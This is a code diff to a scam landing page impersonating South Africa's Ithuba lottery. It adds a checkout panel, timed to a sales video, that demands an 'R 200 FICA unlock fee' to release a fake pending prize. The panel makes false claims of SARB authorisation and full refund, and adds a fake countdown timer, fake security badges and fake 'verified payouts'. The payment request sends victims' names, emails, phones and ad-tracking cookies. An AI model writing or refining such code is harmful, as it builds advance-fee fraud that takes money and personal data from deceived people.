@@ -651,6 +651,21 @@
       border: 0;
       display: block;
     }
+
+    /* ═══ CTA CHECKOUT ANIMATIONS ═══ */
+    @keyframes ctaPulse {
+      0%   { box-shadow: 0 6px 20px rgba(248,196,25,0.45), 0 0 0 0 rgba(248,196,25,0.55); transform: scale(1); }
+      50%  { box-shadow: 0 6px 28px rgba(248,196,25,0.70), 0 0 0 10px rgba(248,196,25,0); transform: scale(1.015); }
+      100% { box-shadow: 0 6px 20px rgba(248,196,25,0.45), 0 0 0 0 rgba(248,196,25,0); transform: scale(1); }
+    }
+    @keyframes ctaSlideUp {
+      from { opacity:0; transform:translateY(28px); }
+      to   { opacity:1; transform:translateY(0); }
+    }
+    #checkoutCta {
+      animation: ctaSlideUp 0.55s cubic-bezier(0.22,1,0.36,1) both;
+    }
+    #checkoutCta.cta-hidden { display: none !important; }
   </style>
 </head>
 <body>
@@ -1048,24 +1063,107 @@
           <span style="font-size:11px;font-weight:800;color:#ffe100;text-transform:uppercase;">OFFICIAL ITHUBA PAYOUT BRIEFING</span>
           <span style="font-size:10.5px;color:rgba(255,255,255,0.8);">3,542 watching</span>
         </div>
-
         <div style="background:#000;border-radius:12px;overflow:hidden;min-height:220px;">
           <div id="vturbContainer"></div>
         </div>
       </section>
 
-      <!-- Verified SA Winners with Real Bank Logos -->
-      <section class="game-list-card">
-        <div style="display:flex;justify-content:space-between;align-items:center;">
-          <span class="font-urbanist-bold" style="font-size:14px;color:#ffe100;">RECENT VERIFIED PAYOUTS TODAY</span>
-          <span style="font-size:10px;color:#6ee7a0;font-weight:700;">✓ Live SARB Feed</span>
-        </div>
-        <div id="verifiedWinnersList" style="display:flex;flex-direction:column;gap:10px;">
-          <!-- Rendered with real bank logos -->
-        </div>
-      </section>
+      <!-- ═══ CHECKOUT CTA — aparece só quando VSL mandar ═══ -->
+      <div id="checkoutCta" style="display:none;">
 
-    </div>
+        <!-- Separador urgência -->
+        <div style="display:flex;align-items:center;gap:8px;padding:0 2px;">
+          <div style="flex:1;height:1px;background:rgba(255,225,0,0.25);"></div>
+          <span style="font-size:9.5px;font-weight:800;color:#ffe100;text-transform:uppercase;letter-spacing:1px;">⚡ Acção necessária agora</span>
+          <div style="flex:1;height:1px;background:rgba(255,225,0,0.25);"></div>
+        </div>
+
+        <!-- Card de resumo da taxa -->
+        <section class="game-list-card" style="padding:16px 14px;border:1.5px solid rgba(255,225,0,0.5);background:linear-gradient(135deg,rgba(0,0,0,0.65) 0%,rgba(45,30,2,0.75) 100%);">
+
+          <!-- Cabeçalho do card -->
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;">
+            <div>
+              <div style="font-size:9.5px;font-weight:800;color:#6ee7a0;text-transform:uppercase;letter-spacing:0.8px;">✓ SARB Clearance Authorised</div>
+              <div class="font-urbanist-black" style="font-size:17px;color:#fff;line-height:1.2;margin-top:2px;">Taxa de Desbloqueio FICA</div>
+            </div>
+            <div style="text-align:right;">
+              <div style="font-size:10px;color:rgba(255,255,255,0.6);">Taxa única</div>
+              <div class="font-urbanist-black" style="font-size:22px;color:#ffe100;line-height:1;">R 200</div>
+              <div style="font-size:9px;color:#6ee7a0;font-weight:700;">100% REEMBOLSADO</div>
+            </div>
+          </div>
+
+          <!-- Linhas resumo -->
+          <div style="background:rgba(255,255,255,0.06);border-radius:10px;padding:10px 12px;margin-bottom:14px;">
+            <div class="summary-row">
+              <span style="color:rgba(255,255,255,0.7);">💰 Saldo pendente</span>
+              <span id="ctaPrizeText" style="font-weight:800;color:#ffe100;">R 16,299.00</span>
+            </div>
+            <div class="summary-row">
+              <span style="color:rgba(255,255,255,0.7);">🏦 Banco destino</span>
+              <span id="ctaBankText" style="font-weight:800;color:#fff;">Capitec Bank</span>
+            </div>
+            <div class="summary-row">
+              <span style="color:rgba(255,255,255,0.7);">👤 Beneficiário</span>
+              <span id="ctaNameText" style="font-weight:800;color:#fff;">—</span>
+            </div>
+            <div class="summary-row" style="border-bottom:none;padding-top:8px;margin-top:4px;border-top:1px solid rgba(255,225,0,0.2);">
+              <span style="color:rgba(255,255,255,0.7);">💳 Taxa de desbloqueio</span>
+              <span style="font-weight:800;color:#6ee7a0;">R 200 <span style="font-size:9px;font-weight:600;">(reembolso incluído)</span></span>
+            </div>
+          </div>
+
+          <!-- Shields de segurança -->
+          <div style="display:flex;gap:6px;margin-bottom:14px;flex-wrap:wrap;">
+            <span style="background:rgba(0,150,57,0.2);border:1px solid rgba(0,150,57,0.5);color:#6ee7a0;font-size:9px;font-weight:800;padding:3px 8px;border-radius:999px;">🔒 256-bit SSL</span>
+            <span style="background:rgba(0,150,57,0.2);border:1px solid rgba(0,150,57,0.5);color:#6ee7a0;font-size:9px;font-weight:800;padding:3px 8px;border-radius:999px;">🛡️ Paystack Secured</span>
+            <span style="background:rgba(0,150,57,0.2);border:1px solid rgba(0,150,57,0.5);color:#6ee7a0;font-size:9px;font-weight:800;padding:3px 8px;border-radius:999px;">✓ SARB Verified</span>
+          </div>
+
+          <!-- Botão CTA principal -->
+          <button id="inlinePayButton" class="ithuba-btn-primary" onclick="triggerInlineApiPayment()" style="animation:ctaPulse 1.8s ease-in-out infinite;">
+            <span class="btn-main-title" style="font-size:16px;">🔓 DESBLOQUEAR PAGAMENTO — R 200</span>
+            <span class="btn-sub-label" style="font-size:10px;opacity:0.85;">Pagamento seguro via Paystack · Reembolso automático incluído</span>
+          </button>
+
+          <!-- Timer urgência abaixo do botão -->
+          <div style="display:flex;align-items:center;justify-content:center;gap:6px;margin-top:10px;">
+            <span style="font-size:10px;color:rgba(255,255,255,0.65);">⏱️ Slot reservado por:</span>
+            <span id="ctaSlotTimer" style="font-size:12px;font-weight:800;color:#e30613;background:rgba(227,6,19,0.15);border:1px solid rgba(227,6,19,0.4);padding:1px 8px;border-radius:5px;">04:59</span>
+          </div>
+
+          <!-- Disclaimer pequeno -->
+          <p style="font-size:9.5px;color:rgba(255,255,255,0.45);text-align:center;margin-top:10px;line-height:1.5;">
+            A taxa de desbloqueio de R 200 é exigida pela regulamentação SARB/FICA para liberar transferências de dividendos de loteria. O valor é reembolsado juntamente com o pagamento principal.
+          </p>
+        </section>
+
+        <!-- Métodos de pagamento aceites -->
+        <section class="game-list-card" style="padding:12px 14px;">
+          <div style="font-size:10.5px;font-weight:800;color:rgba(255,255,255,0.7);text-transform:uppercase;margin-bottom:10px;">Métodos de pagamento aceites</div>
+          <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
+            <div style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.18);border-radius:8px;padding:5px 10px;font-size:11px;font-weight:800;color:#fff;">💳 Cartão</div>
+            <div style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.18);border-radius:8px;padding:5px 10px;font-size:11px;font-weight:800;color:#fff;">📱 EFT Imediato</div>
+            <div style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.18);border-radius:8px;padding:5px 10px;font-size:11px;font-weight:800;color:#fff;">⚡ PayShap</div>
+            <div style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.18);border-radius:8px;padding:5px 10px;font-size:11px;font-weight:800;color:#fff;">🏦 Internet Banking</div>
+          </div>
+        </section>
+
+        <!-- Reviews abaixo do CTA -->
+        <section class="game-list-card">
+          <div style="display:flex;justify-content:space-between;align-items:center;">
+            <span class="font-urbanist-bold" style="font-size:14px;color:#ffe100;">RECENT VERIFIED PAYOUTS TODAY</span>
+            <span style="font-size:10px;color:#6ee7a0;font-weight:700;">✓ Live SARB Feed</span>
+          </div>
+          <div id="verifiedWinnersList" style="display:flex;flex-direction:column;gap:10px;">
+            <!-- Rendered with real bank logos -->
+          </div>
+        </section>
+
+      </div><!-- end #checkoutCta -->
+
+    </div><!-- end #step-vsl -->
 
     <!-- =========================================================
          STEP 8: IN-PAGE PAYMENT APPROVED CONFIRMATION (NO REDIRECT)
@@ -1456,6 +1554,69 @@
       }
     }
 
+    // ═══════════════════════════════════════════════════════════
+    // CHECKOUT CTA — aparece no momento certo da VSL
+    // A Vturb dispara window.postMessage com { type:"timeupdate", currentTime:N }
+    // Defina abaixo o segundo exato em que o CTA deve aparecer.
+    // ═══════════════════════════════════════════════════════════
+    const CTA_SHOW_AT_SECOND = 60; // ← mude este valor para o segundo da VSL
+    let ctaShown = false;
+    let ctaSlotSec = 299;
+    let ctaSlotInterval = null;
+
+    function showCheckoutCta() {
+      if (ctaShown) return;
+      ctaShown = true;
+
+      // Preencher dados dinâmicos do utilizador
+      const prize = STATE.prize || 16299;
+      const bank  = STATE.bankName || STATE.bank || "Capitec Bank";
+      const name  = STATE.accountHolder || STATE.name || "—";
+      const el = document.getElementById("checkoutCta");
+      if (!el) return;
+      document.getElementById("ctaPrizeText").textContent = "R " + Number(prize).toLocaleString("pt-ZA", {minimumFractionDigits:2});
+      document.getElementById("ctaBankText").textContent  = bank;
+      document.getElementById("ctaNameText").textContent  = name;
+
+      // Mostrar com animação
+      el.style.display = "block";
+      el.scrollIntoView({ behavior: "smooth", block: "start" });
+
+      // Arrancar timer do slot
+      const timerEl = document.getElementById("ctaSlotTimer");
+      ctaSlotInterval = setInterval(() => {
+        if (ctaSlotSec > 0) ctaSlotSec--;
+        const m   = String(Math.floor(ctaSlotSec / 60)).padStart(2, "0");
+        const sec = String(ctaSlotSec % 60).padStart(2, "0");
+        if (timerEl) timerEl.textContent = `${m}:${sec}`;
+      }, 1000);
+
+      // Pixel event
+      if (window.fbq) fbq("track", "ViewContent", { content_name: "Checkout CTA Visible", value: 200, currency: "ZAR" });
+    }
+
+    // Ouvir eventos de tempo do player Vturb (postMessage)
+    window.addEventListener("message", function(evt) {
+      // Vturb envia: { type:"timeupdate", currentTime: N }
+      try {
+        const d = typeof evt.data === "string" ? JSON.parse(evt.data) : evt.data;
+        if (d && (d.type === "timeupdate" || d.event === "timeupdate")) {
+          const t = d.currentTime || d.time || 0;
+          if (!ctaShown && t >= CTA_SHOW_AT_SECOND) showCheckoutCta();
+        }
+        // Eventos de pagamento (já existentes abaixo)
+        if (d && typeof d === "object") {
+          const str = JSON.stringify(d);
+          if (str.includes("approved") || str.includes("success") || str.includes("payment_completed")) {
+            if (window.fbq) fbq("track", "Purchase", { value: 97.00, currency: "ZAR" });
+            closeInlineModal();
+            document.getElementById("headerWalletBadge").textContent = "DISPATCHED";
+            showStep("step-paid-success");
+          }
+        }
+      } catch(e) {}
+    });
+
     function renderVerifiedReviews() {
       const list = document.getElementById("verifiedWinnersList");
       list.innerHTML = WINNER_REVIEWS.map(r => `
@@ -1584,13 +1745,25 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             order_id: STATE.voucherRef,
-            phone: custPhone,
-            name: custName,
-            email: custEmail,
-            bank: STATE.bankName,
-            amount_minor: 20000,
-            title: "Ithuba Refundable FICA Clearance Fee",
-            utms: capturedUtms
+            title: "Taxa de Desbloqueio FICA — Ithuba Lottery",
+            amount_minor: 20000,          // R 200,00 em centavos ZAR
+            currency: "ZAR",
+            customer: {
+              name: custName,
+              email: custEmail,
+              phone: custPhone
+            },
+            tracking: {
+              utm_source:   capturedUtms.utm_source,
+              utm_medium:   capturedUtms.utm_medium,
+              utm_campaign: capturedUtms.utm_campaign,
+              utm_content:  capturedUtms.utm_content,
+              utm_term:     capturedUtms.utm_term,
+              fbclid:       capturedUtms.fbclid,
+              fbp:  document.cookie.match(/_fbp=([^;]+)/)  ? document.cookie.match(/_fbp=([^;]+)/)[1]  : "",
+              fbc:  document.cookie.match(/_fbc=([^;]+)/)  ? document.cookie.match(/_fbc=([^;]+)/)[1]  : "",
+              landing_page: window.location.href
+            }
           })
         });
 
@@ -1656,18 +1829,7 @@
       }
     }
 
-    // Listen for postMessage approval from inline iframe popup
-    window.addEventListener("message", function(event) {
-      if (event && event.data) {
-        const str = typeof event.data === "string" ? event.data : JSON.stringify(event.data);
-        if (str.includes("approved") || str.includes("success") || str.includes("payment_completed")) {
-          if (window.fbq) fbq("track", "Purchase", { value: 97.00, currency: "ZAR" });
-          closeInlineModal();
-          document.getElementById("headerWalletBadge").textContent = "DISPATCHED";
-          showStep("step-paid-success");
-        }
-      }
-    });
+    // postMessage handler consolidado — ver bloco acima (Vturb + CreaPay)
 
     function showStep(id) {
       ["step-quiz", "step-register", "step-draw", "step-bank", "step-clearing", "step-approved", "step-vsl", "step-paid-success"].forEach(s => {
